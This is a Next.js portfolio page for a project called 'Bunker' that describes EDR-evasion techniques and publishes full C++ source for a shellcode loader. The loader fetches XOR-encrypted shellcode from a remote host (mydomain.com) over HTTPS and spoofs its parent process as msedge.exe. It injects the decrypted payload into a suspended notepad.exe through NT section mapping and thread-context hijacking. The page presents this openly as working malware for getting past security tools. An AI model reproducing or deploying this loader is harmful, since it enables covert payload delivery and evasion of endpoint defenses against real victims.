import { Metadata } from "next";
import Link from "next/link";

export const metadata: Metadata = {
  title: "Bunker - Youssef Ennaciri",
  description: "Advanced malware techniques using NT API calls, PPID spoofing, encrypted shellcode, and more to bypass EDR detection",
};

export default function BunkerProject() {
  return (
    <section className="relative">
      <div className="max-w-4xl mx-auto px-4 sm:px-6">
        <div className="pt-32 pb-12 md:pt-40 md:pb-20">
          <Link
            href="/projects"
            className="inline-flex items-center text-indigo-400 hover:text-indigo-300 mb-8"
          >
            <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path>
            </svg>
            Back to Projects
          </Link>

          <article className="max-w-none">
            <h1 className="h1 mb-6 font-nacelle text-gray-200 text-4xl md:text-5xl">Bunker</h1>

            <p className="text-lg text-indigo-200/65 mb-4">
              The malware below incorporates several techniques used together to get passed through EDR scans:
            </p>

            <ul className="list-disc pl-6 mb-4 space-y-2 text-lg text-indigo-200/65">
              <li><strong>NT API Calls (Direct Syscalls)</strong> – Bypassing user-mode hooks</li>
              <li><strong>PPID Spoofing</strong> – Masquerading as a legitimate process</li>
              <li><strong>Encrypted Shellcode</strong> – Avoiding static detection</li>
              <li><strong>Process Mitigation Policies</strong> – Prevents modules from loading into the implant</li>
              <li><strong>Thread Stack Spoofing</strong> – Hiding malicious execution flows</li>
              <li><strong>Sleepmask Obfuscation</strong> – Evading memory scanners</li>
            </ul>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Thread Stack Spoofing</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              EDR solutions perform call stack analysis to identify malicious execution flows by walking stack frames during sensitive API calls (SleepEx). Thread stack spoofing subverts this detection mechanism by manipulating return addresses and stack pointers prior to executing payloads.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              The Cobalt Strike Artifact Kit enhances this technique through fiber-based execution, which provides an alternative scheduling mechanism that bypasses standard thread-based inspection. By converting the primary thread to a fiber.
            </p>

            <div className="my-6">
              <img
                src="/images/bunker-screenshot-1.png"
                alt="Thread stack spoofing demonstration"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <p className="text-lg text-indigo-200/65 mb-4">
              After generating and executing a new payload, you will see that the call stack now returns to RtlUserFibreStart instead of SleepEx
            </p>

            <div className="my-6">
              <img
                src="/images/bunker-screenshot-2.png"
                alt="Call stack returning to RtlUserFibreStart instead of SleepEx"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Sleepmask Obfuscation</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              Sleepmask techniques dynamically encrypt in-memory payloads during sleep operations to thwart memory scanning tools like PE-sieve or Moneta. When the malware enters an idle state (e.g., via <code className="bg-gray-800 px-1 rounded">Sleep()</code>), critical code sections such as shellcode or reflective DLLs are XOR/AES-encrypted in real-time, while only leaving behind a small, benign-looking stub. The decryption key remains in volatile registers or stack variables, ensuring the payload disappears from memory dumps.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              🔹 <strong>Runtime Protection</strong>: Memory regions are temporarily unmapped or marked as <code className="bg-gray-800 px-1 rounded">PAGE_NOACCESS</code> during scans.<br/>
              🔹 <strong>Anti-Forensics</strong>: Defeats signature-based scans by transforming memory artifacts while preserving execution flow.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              This method forces analysts to catch the payload mid-decryption, significantly reducing detection windows.
            </p>

            <div className="my-6">
              <img
                src="/images/bunker-screenshot-3.png"
                alt="Sleepmask obfuscation demonstration"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">XORed Shellcode Generation</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              "Scramble payloads on compile-time to evade static scans. A simple XOR cipher flips bits to break signature detection while keeping runtime decryption trivial."
            </p>

            <div className="my-6">
              <img
                src="/images/bunker-screenshot-4.png"
                alt="XORed Shellcode Generation demonstration"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">PPID Spoofing: Masquerading as Legitimate Processes</h2>
            <p className="text-lg text-indigo-200/65 mb-4">
              Modern EDR solutions monitor process creation events, flagging suspicious parent-child relationships (e.g., <code className="bg-gray-800 px-1 rounded">cmd.exe</code> spawning <code className="bg-gray-800 px-1 rounded">powershell.exe</code>). PPID (Parent Process ID) spoofing bypasses this by making malicious processes appear to descend from trusted system processes like <code className="bg-gray-800 px-1 rounded">explorer.exe</code> or <code className="bg-gray-800 px-1 rounded">msedge.exe</code>.
            </p>

            <p className="text-lg text-indigo-200/65 mb-4">
              The technique works by:
            </p>

            <ol className="list-decimal pl-6 mb-4 space-y-2 text-lg text-indigo-200/65">
              <li>Creating a suspended process via <code className="bg-gray-800 px-1 rounded">CreateProcess</code> with <code className="bg-gray-800 px-1 rounded">CREATE_SUSPENDED</code></li>
              <li>Using <code className="bg-gray-800 px-1 rounded">NtQueryInformationProcess</code> to locate and modify the <code className="bg-gray-800 px-1 rounded">PEB</code>'s parent PID</li>
              <li>Calling <code className="bg-gray-800 px-1 rounded">NtResumeProcess</code> to activate the process with its spoofed parentage</li>
            </ol>

            <div className="my-6">
              <img
                src="/images/bunker-screenshot-5.png"
                alt="PPID Spoofing demonstration"
                className="mx-auto rounded-lg border border-gray-700"
                width={800}
                height={450}
              />
            </div>

            <h2 className="text-xl font-bold text-gray-200 mb-4 mt-8">Direct Syscalls + In-memory Shellcode + Process Mitigation Policies + PPID</h2>
            <div className="my-4 p-4 bg-gray-800/50 rounded-lg border border-gray-700">
              <pre className="whitespace-pre-wrap text-sm text-gray-300 overflow-x-auto">
                {`/*
downloads encrypted shellcode 
decrypted shellcode injection through NT api 
bypass hooks
find dynamically explorer.exe PID 
PPID using explorer.exe PID
*/

#include <Windows.h>
#include <winternl.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include "NT.h"

#pragma comment(lib, "winhttp.lib")
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);

//XOR function from Sektor 7
void XOR(BYTE* data, size_t data_len, char* key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main()
{
    //declare attribute list number as default 1
    const DWORD attributeCount = 2;
    // create startup info structa
    LPSTARTUPINFOEXW startup_info = new STARTUPINFOEXW();
    startup_info->StartupInfo.cb = sizeof(STARTUPINFOEXW);
    startup_info->StartupInfo.dwFlags = STARTF_USESHOWWINDOW;

    //declare buffer size for the list
    SIZE_T lpSize = 0;
    // call once to get lpSize
    InitializeProcThreadAttributeList(
        NULL,
        attributeCount,
        0,
        &lpSize);

    // allocate the memory
    startup_info->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

    // call again to initialise the list
    InitializeProcThreadAttributeList(
        startup_info->lpAttributeList,
        attributeCount,
        0,
        &lpSize);

    // open a handle to the desired parent
    /*Get PID of the parent process dynamically without specifing the PID number, rather it's name*/
    /*-------------------------------------*/
    DWORD explorerPID = 0;

    // Take a snapshot of all processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Find explorer.exe
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"msedge.exe") == 0) {
                    explorerPID = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
    }

    if (explorerPID == 0) {
        // Handle the case where explorer.exe is not found
        printf("Failed to find explorer.exe.\n");
        return 1;
    }
    /*-------------------------------------*/


    HANDLE hParent = OpenProcess(
        PROCESS_CREATE_PROCESS,
        FALSE,
        explorerPID); // hardcoded pid of explorer

    // update the list
    UpdateProcThreadAttribute(
        startup_info->lpAttributeList,
        NULL,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(HANDLE),
        NULL,
        NULL);

    //add process mititgation
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(
        startup_info->lpAttributeList,
        NULL,
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
        &policy,
        sizeof(HANDLE),
        NULL,
        NULL);

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"notepad.exe\\0";

    // create process
    BOOL success = CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL,
        NULL,
        &startup_info->StartupInfo,
        process_info);

    // download shellcode
    std::vector<BYTE> shellcode = Download(L"mydomain.com\\0", L"/shellenrypted\\0");
    char key[] = "jiddddddddddddddddddd";

    //size_t key_len = sizeof(key) - 1; // Exclude null terminator

    // Get the data pointer and size
   // BYTE* shellcode = shellcode.data(); // Direct pointer to the vector's data
    size_t shellcode_len = shellcode.size();

    // Decrypt the shellcode
    XOR(&shellcode[0], shellcode_len, key, sizeof(key));


    // find Nt APIs
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
    CloseHandle(hParent);
    CloseHandle(hSection);
}


std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTPS_PORT,            // port 443
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}`}
              </pre>
            </div>
          </article>
        </div>
      </div>
    </section>
  );
}